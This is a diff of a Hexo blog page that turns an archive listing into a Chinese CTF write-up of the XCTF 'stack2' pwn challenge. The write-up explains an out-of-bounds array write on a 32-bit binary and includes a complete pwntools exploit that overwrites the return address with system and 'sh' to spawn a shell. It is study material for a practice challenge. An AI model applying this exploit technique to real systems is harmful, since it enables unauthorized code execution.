@@ -6,15 +6,32 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2021/4 | Hexo</title>
+  <title>stack2--xctf的题解 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/2021/04/index.html">
+  <meta name="description" content="—XCTF 4th-QCTF-2018前言，怎么说呢，这题目还是把我折磨的可以的，我一开始是没有看到后面的直接狙击的，只能说呢。 我的不经意间的粗心，破坏了你许多的温柔">
+<meta property="og:type" content="article">
+<meta property="og:title" content="stack2--xctf的题解">
+<meta property="og:url" content="http://example.com/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Astack2--xctf--%E9%A2%98%E8%A7%A3/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="—XCTF 4th-QCTF-2018前言，怎么说呢，这题目还是把我折磨的可以的，我一开始是没有看到后面的直接狙击的，只能说呢。 我的不经意间的粗心，破坏了你许多的温柔">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210418110251236.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021041811040169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210418110434175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210418111116956.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210418111627412.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210418111726740.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210418111807484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210418111831869.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210418112940437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210418113033904.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210418113750615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210418114153205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2021-04-26T12:06:45.996Z">
+<meta property="article:modified_time" content="2021-04-26T12:15:57.575Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210418110251236.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -150,265 +167,196 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-题目：stack2--xctf--题解" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/%E6%84%9F%E6%83%B3%EF%BC%9A%E5%85%B3%E4%BA%8E%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2021-04-26T12:08:03.179Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/%E6%84%9F%E6%83%B3%EF%BC%9A%E5%85%B3%E4%BA%8E%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">感想：关于整数安全漏洞</a>
+    <h1 class="article-title" itemprop="name">
+      stack2--xctf的题解
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Astack2--xctf--%E9%A2%98%E8%A7%A3/" class="archive-article-date">
+        
+        <a href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Astack2--xctf--%E9%A2%98%E8%A7%A3/" class="archive-article-date">
   	<time datetime="2021-04-26T12:06:45.996Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Astack2--xctf--%E9%A2%98%E8%A7%A3/">stack2--xctf的题解</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=362998&auto=0&height=66"></iframe>
 
-        <div class="article-info info-on-right">
-          
-          
+<h3 id="—XCTF-4th-QCTF-2018"><a href="#—XCTF-4th-QCTF-2018" class="headerlink" title="—XCTF 4th-QCTF-2018"></a>—XCTF 4th-QCTF-2018</h3><p>前言，怎么说呢，这题目还是把我折磨的可以的，我一开始是没有看到后面的直接狙击的，只能说呢。</p>
+<p><em><strong>我的不经意间的粗心，破坏了你许多的温柔</strong></em></p>
+<span id="more"></span>
+<h4 id="1-气的我直接检查保护："><a href="#1-气的我直接检查保护：" class="headerlink" title="1.气的我直接检查保护："></a>1.气的我直接检查保护：</h4><p><img src="https://img-blog.csdnimg.cn/20210418110251236.png" alt="在这里插入图片描述"><br>32位程序，开启了canary保护。</p>
+<h4 id="2-ida查看："><a href="#2-ida查看：" class="headerlink" title="2.ida查看："></a>2.ida查看：</h4><p><img src="https://img-blog.csdnimg.cn/2021041811040169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210418110434175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>首先放的第一幅图片呢，是我一开始以为可以溢出的，也可以看见我旁边标注了一个maybeoverflow。</p>
+<ul>
+<li>但是是不可以的，因为首先由于这里的 i 最大上限100，可能有的人头铁就要说了，这里v7可以慢慢溢出去修改i，（和我一样）<br>可是这里v13的存储位置是和i有关的，所以不可能让你能一直溢出，后面看到了canary，我又去找了找格式化漏洞，没有找到，最最最离谱的是：</li>
+<li><strong>我居然想着去修改tls字段的canary数值和canary数值（有这个方法，但是这里用不了）</strong>*</li>
+</ul>
+<p>最后看到当我输入3的时候，那里有一个非常明显的定向狙击。</p>
+<p>那就很简单了，去开心的写exp，确定 <em><strong>偏移量为74</strong></em><br><img src="https://img-blog.csdnimg.cn/20210418111116956.png" alt="在这里插入图片描述"><br>那就v13[0x74]=???v13[0x75]=???</p>
+<p>结果就是失败，为什么呢？？？<br>答案是这道题它后面会对栈帧做一定调整，也就是ebp上面一位高地址的地方并不是返回地址，我们这里可以结合着汇编代码看一下<br><img src="https://img-blog.csdnimg.cn/20210418111627412.png" alt="在这里插入图片描述"><br>在没有运行结束前，ebp下一位标的返回地址是0xffffd15c,但是我们看看ida里面的代码：<br><img src="https://img-blog.csdnimg.cn/20210418111726740.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210418111807484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210418111831869.png" alt="在这里插入图片描述"><br>导致跳的返回地址是在ebp的高0x10个字节出，所以我们定向爆破的时候呢，其实狙击的位置是v13[0x84]的地方向上四个字节，所以初步的代码应该是： <strong>不想写了，懒得改了</strong></p>
+<p>有人说服务器上没有hackhere那个函数的里面的shell执行器bash，所以要用sh,这里就有个小tips;system(‘sh’)也是可以获得shell的，这样的 话，我们就可以写exp了，我们先去找system@plt表的地址：<br><img src="https://img-blog.csdnimg.cn/20210418112940437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们再去找sh的位置：<br><img src="https://img-blog.csdnimg.cn/20210418113033904.png" alt="在这里插入图片描述"><br>这里用第一个，因为第一个字符串参数是有结束符的：<br>然后就直接写exp吧：（exp默写的别人，因为别人写的确实漂亮）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./stack2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">offset=<span class="number">0x84</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">offset,value</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;5. exit\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;which number to change:\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;new number:\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(value))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = [<span class="number">0x50</span>, <span class="number">0x84</span>, <span class="number">0x04</span>, <span class="number">0x08</span>]</span><br><span class="line"></span><br><span class="line">sh=[<span class="number">0x87</span>,<span class="number">0x89</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	leak(offset+i,system[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	leak(offset+<span class="number">8</span>+i,sh[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="3-这道题目得到的启发："><a href="#3-这道题目得到的启发：" class="headerlink" title="3.这道题目得到的启发："></a>3.这道题目得到的启发：</h4><ul>
+<li>1.首先呢就是每个地址前面标的地址是就是这个地方最后一位低地址的，也就是我画个图看看<img src="https://img-blog.csdnimg.cn/20210418113750615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
+</ul>
+<p>2.学到了system(‘sh’)是可以直接执行获得shell的</p>
+<h4 id="4-还没有学到的东西："><a href="#4-还没有学到的东西：" class="headerlink" title="4.还没有学到的东西："></a>4.还没有学到的东西：</h4><ul>
+<li>1.栈转移</li>
+<li>2.修改stack——fail的got表地址.</li>
+<li>3.关于修改got表的题目我一道都没有做过32位还有点准备，64位，没有准备</li>
+<li>4.关于直接同时爆破tls字段的和canary段的数值。</li>
+</ul>
+<p>我真垃圾，呜呜呜，居然忘记了32位传递参数中间的返回地址！！！<br><img src="https://img-blog.csdnimg.cn/20210418114153205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>嘿嘿，放上我的龙！！！</p>
 
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>请给我debug<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/pay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Astack2--xctf--%E9%A2%98%E8%A7%A3/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/%E6%84%9F%E6%83%B3%EF%BC%9Aelf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%EF%BC%8C%E5%9F%BA%E4%BA%8Elink%E6%97%B6/" class="archive-article-date">
-  	<time datetime="2021-04-26T12:04:35.297Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2021/04/26/%E6%84%9F%E6%83%B3%EF%BC%9A%E5%85%B3%E4%BA%8E%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          感想：关于整数安全漏洞
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/04/26/%E6%84%9F%E6%83%B3%EF%BC%9Aelf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%EF%BC%8C%E5%9F%BA%E4%BA%8Elink%E6%97%B6/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">elf文件格式解析(link status)</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/%E6%84%9F%E6%83%B3%EF%BC%9Aelf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%EF%BC%8C%E5%9F%BA%E4%BA%8Elink%E6%97%B6/">elf文件格式解析(link status)</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Aforgot%E9%A2%98%E8%A7%A3--%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwpmd/" class="archive-article-date">
-  	<time datetime="2021-04-26T12:02:30.400Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Aforgot%E9%A2%98%E8%A7%A3--%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwpmd/">forgot题解</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Adice_game--%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/" class="archive-article-date">
-  	<time datetime="2021-04-26T12:00:25.256Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Adice_game--%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/">dice_game的题解</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Apwn200/" class="archive-article-date">
-  	<time datetime="2021-04-26T11:59:12.801Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Apwn200/">pwn200--攻防世界的题解</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Awelpwn%E9%A2%98%E8%A7%A3--%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" class="archive-article-date">
-  	<time datetime="2021-04-26T11:56:28.842Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Awelpwn%E9%A2%98%E8%A7%A3--%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">welpwn的题解</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/first/" class="archive-article-date">
-  	<time datetime="2021-04-26T06:38:54.129Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/first/">my frist blog</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/hello-world/" class="archive-article-date">
-  	<time datetime="2021-04-26T06:27:13.977Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/hello-world/">Hello World</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -431,8 +379,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
